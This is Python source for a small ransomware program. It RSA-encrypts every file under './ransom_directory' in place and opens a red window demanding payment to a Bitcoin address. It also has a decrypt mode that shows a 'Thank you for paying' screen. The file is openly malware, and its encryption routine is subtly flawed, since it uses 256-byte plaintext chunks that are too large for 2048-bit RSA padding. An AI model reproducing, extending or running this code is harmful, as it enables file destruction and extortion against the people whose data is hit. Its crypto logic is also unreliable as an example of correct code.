import rsa, sys, os
import tkinter as tk
import colorama
colorama.init()

def generate_key_pair():
    
    try:
        with open('public.pem', 'r') as f:
            public_key = rsa.PublicKey.load_pkcs1(f.read().encode())
        with open('private.pem', 'r') as f:
            private_key = rsa.PrivateKey.load_pkcs1(f.read().encode())
        print(colorama.Fore.CYAN + "[i] - Keys loaded successfully")
        return public_key, private_key
    except:
        pass
    
    (public_key, private_key) = rsa.newkeys(2048)
    with open('public.pem', 'w+') as f:
        f.write(public_key.save_pkcs1().decode())
    with open('private.pem', 'w+') as f:
        f.write(private_key.save_pkcs1().decode())
    return public_key, private_key

def encrypt(data, key):
    encrypted_data = b""
    chunk_size = 256

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        encrypted_chunk = rsa.encrypt(chunk, key)
        encrypted_data += encrypted_chunk
        
    return encrypted_data
        
def decrypt(data, key):
    decrypted_data = b""
    chunk_size = 256

    try:
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i + chunk_size]
            if len(chunk) < chunk_size:
                chunk_size = len(chunk)
            decrypted_chunk = rsa.decrypt(chunk, key)
            decrypted_data += decrypted_chunk
            
    except Exception as e:
        print(colorama.Fore.YELLOW + "[!] - Error: {}".format(e))
        
    return decrypted_data

def read_n_write(key, mode, folder='./ransom_directory'):

    files = os.walk(folder)
    
    try:
        for path, _, file_names in files:
            for file_name in file_names:
                file_path = os.path.join(path, file_name)
                with open(file_path, 'rb') as f:
                    data = f.read()
                with open(file_path, 'wb') as f:
                    if mode == 'encrypt':
                        f.write(encrypt(data, key))
                    else:
                        f.write(decrypt(data, key))
    except Exception as e:
        print(colorama.Fore.YELLOW + "[!] - Error: {}".format(e))
        exit(1)

def your_files_are_encrypted():
    root = tk.Tk()
    root.title("Your files are encrypted")
    root.geometry("700x500")
    root.configure(background='red')
    
    label = tk.Label(root, text="Your files are encrypted", font=("Arial", 15))
    btc_addrs = tk.Label(root, text="Pay 1$ for decryption : 1F1tAaz5x1HMaxCNLbtCMamxw6x4pdNn4xqX", font=("Arial", 15))
    
    label.pack(pady=10)
    btc_addrs.pack(pady=10)
    
    root.mainloop()

def thank_you():
    try:
        root = tk.Tk()
        root.title("Thank you")
        root.geometry("300x100")
        root.configure(background='green')
        
        label = tk.Label(root, text="Thank you for paying", font=("Arial", 15))
        label.pack(pady=10)
        
        root.mainloop()
        
    except Exception as e:
        print(colorama.Fore.RED + "[!] - Error: {}".format(e))

def main(mode='encrypt'):
    
    public_key, private_key = generate_key_pair()
    
    try:
        if sys.argv[1] == 'decrypt':
            mode = 'decrypt'
    except:
        pass
    
    if mode == 'encrypt':
        print(colorama.Fore.RED + "[i] - Encrypting your files...")
        read_n_write(public_key, mode)
        your_files_are_encrypted()
        
    elif mode == 'decrypt':
        print(colorama.Fore.GREEN + "[i] - Decrypting your files...")
        read_n_write(private_key, mode)
        thank_you()

if __name__ == '__main__':
    main()